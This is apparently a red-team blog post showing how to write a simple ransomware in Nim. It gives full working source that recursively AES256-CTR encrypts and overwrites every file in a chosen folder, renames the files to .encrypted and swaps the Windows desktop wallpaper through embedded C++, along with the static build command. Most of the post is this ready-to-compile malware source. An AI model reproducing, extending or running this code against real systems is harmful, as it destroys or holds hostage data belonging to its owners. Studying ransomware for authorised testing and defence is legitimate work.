---
title: Exploring Nim language - Writing a ransomware
author: Ilan Kalendarov
date: 2021-03-01 16:10:00 +0800
categories: [Red Team]
tags: [ransomware, red team]

---

## Introduction

------

During one of my engagements I needed to encrypt an asset on the domain so, I started to explore what would be the simplest yet not easy to decrypt way of doing so. I came by the Nim language and started building my "Ransomware".

The Nim language was really interesting to me as it compiles to C, C++ or JavaScript and has a syntax that resembles Python.  I noticed the language is getting more popular on Twitter thanks to [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) and his amazing repo [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim). After exploring I saw a few new malware that has been [rewritten in  Nim](https://www.bleepingcomputer.com/news/security/trickbots-bazarbackdoor-malware-is-now-coded-in-nim-to-evade-antivirus/) So I decided to hop on the Nim trend and try to write simple yet powerful ransomware.



## Preparing the environment 

------

First, we need to prepare our setup. You can find the installation page [here](https://nim-lang.org/install.html). After installing Nim we need to set up our dev environment. You can follow the steps inside the [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim#setting-up-a-dev-environment) repo.  Now we can actually start coding



## The encryption

------

Inside the OffensiveNim repo, there's a [script](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/encrypt_decrypt_bin.nim) that shows how to handle encryption in Nim, AES256-CTR to be specific, It has all the information we need to start writing our encryption part of the ransomware.  I want to be able to encrypt any given folder recursively, Get the desired folder and key as arguments,Change the file extension and also change the wallpaper (Probably with Windows API). At this point the code should look like this:

```nim
import os
import strformat
import base64
import nimcrypto
import nimcrypto/sysrand

func toByteSeq*(str: string): seq[byte] {.inline.} =
    # Converts a string to the corresponding byte sequence
    @(str.toOpenArrayByte(0, str.high))

let
    password: string = paramStr(1) # Our secret key
    path: string = paramStr(2)	# Full path to the folder
    
for file in walkDirRec path: # For any file/folder inside our folder
   let fileSplit = splitFile(file)
   if fileSplit.ext != ".encrypted": # Checking if the file is not encrypted yet
    echo fmt"[*] Encrypting: {file}"
    var
        inFileContents: string = readFile(file) # Getting the content of the file
        plaintext: seq[byte] = toByteSeq(inFileContents) # Formating the content to bytes
        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        encrypted: seq[byte] = newSeq[byte](len(plaintext))

    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]
    var expandedKey = sha256.digest(password)
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
        
        
    ectx.init(key, iv)
    ectx.encrypt(plaintext, encrypted)
    ectx.clear()

    let encodedCrypted = encode(encrypted) # This var contains the encrypted data
    let finalFile = file & ".encrypted" # Giving a new extension
    moveFile(file, finalFile) # Changing the file extension
    writeFile(finalFile, encodedCrypted) # Writing the encrypted data to the file (Deletes everything  that was there before)

```

Lets try it ! 

![1encrypt](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/Ransomware/1encrypt.gif)

Great it works perfectly. Now, let's try to change the wallpaper. I did some searching and came by the above [API Call](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-systemparametersinfow) from Microsoft - `SystemParametersInfoW`. According to the docs - 

> Retrieves or sets the value of one of the system-wide parameters. This function can also update the user profile while setting a parameter.

In particular the `SPI_SETDESKWALLPAPER` was the flag that was interesting. With the following C++ code we'll be able to change the wallpaper:

```c++
#include <iostream>
#include <Windows.h>

int WallPaper()
{
   const wchar_t *path = L"C:\\Users\\Public\\pic.jpg";
   SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void *)path, SPIF_UPDATEINIFILE);      
   return 0;
}
```

Now to the fun part, We don't need to work hard here with trying to convert the C++ code to Nim, We can just copy-paste (with some modification) the code directly to Nim !

This would be the final code:

```nim
import os
import strformat
import base64
import nimcrypto
import nimcrypto/sysrand

func toByteSeq*(str: string): seq[byte] {.inline.} =
    # Converts a string to the corresponding byte sequence
    @(str.toOpenArrayByte(0, str.high))

let
    password: string = paramStr(1) # Our secret key
    path: string = paramStr(2)	# Full path to the folder
 
# Start of the C++ code
{.emit: """
#include <iostream>
#include <Windows.h>

int Wallpaper()
{
   const wchar_t *path = L"C:\\Users\\Public\\pic.jpg";
   SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void *)path, SPIF_UPDATEINIFILE);      
   return 0;
}
""".}

# Importing the code to nim
proc Wallpaper(): int
    {.importcpp: "Wallpaper", nodecl.}
    
var result = Wallpaper()

for file in walkDirRec path: # For any file/folder inside our folder
   let fileSplit = splitFile(file)
   if fileSplit.ext != ".encrypted": # Checking if the file is not encrypted yet
    echo fmt"[*] Encrypting: {file}"
    var
        inFileContents: string = readFile(file) # Getting the content of the file
        plaintext: seq[byte] = toByteSeq(inFileContents) # Formating the content to bytes
        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        encrypted: seq[byte] = newSeq[byte](len(plaintext))

    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]
    var expandedKey = sha256.digest(password)
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
        
        
    ectx.init(key, iv)
    ectx.encrypt(plaintext, encrypted)
    ectx.clear()

    let encodedCrypted = encode(encrypted) # This var contains the encrypted data
    let finalFile = file & ".encrypted" # Giving a new extension
    moveFile(file, finalFile) # Changing the file extension
    writeFile(finalFile, encodedCrypted) # Writing the encrypted data to the file (Deletes everything  that was there before)
```

Now, I'll compile the code with the above flags:

`nim cpp -d:release --app=console --opt:speed --passl="-static -static-libgcc -static-libstdc++" enc.nim`

And the result :

![2encrypt](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/Ransomware/2encrypt.gif)

I'll let you figure out the decryption part :)



## Conclusion 

------

As you can see, Nim is a really powerful language, It took me an hour to build this "Ransomware" and I think we could really expand the functionality of the program in the future. Maybe I'll make "Exploring Nim language" a series who knows.  



## Links & Resources

------

- [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim)

* [Nim language](https://nim-lang.org/)

